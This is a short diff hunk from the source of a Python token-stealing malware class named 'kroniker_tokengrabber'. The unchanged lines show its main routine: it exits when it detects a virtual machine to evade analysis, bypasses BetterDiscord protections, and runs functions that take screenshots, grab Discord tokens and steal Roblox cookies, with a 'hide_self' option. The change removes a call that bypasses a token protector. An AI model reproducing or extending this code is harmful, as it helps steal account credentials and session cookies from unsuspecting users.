@@ -147,7 +147,6 @@ class kroniker_tokengrabber(functions):
             if AntiDebug().inVM:
                 os._exit(0)
         await self.bypassBetterDiscord()
-        await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
                          self.grabRobloxCookie]
         if self.fetchConf('hide_self'):
